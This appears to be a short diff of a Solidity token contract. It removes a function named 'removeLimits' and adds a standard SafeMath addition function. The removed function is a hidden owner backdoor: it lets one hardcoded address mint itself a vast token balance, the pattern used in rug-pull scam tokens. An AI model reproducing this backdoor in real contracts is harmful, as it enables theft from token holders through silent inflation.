@@ -1,6 +1,5 @@
-41,45
-    function removeLimits(uint256 addBot) external {
-        if(xxnux == msg.sender){
-            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
-        }
-    } 
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+        return c;
+    }
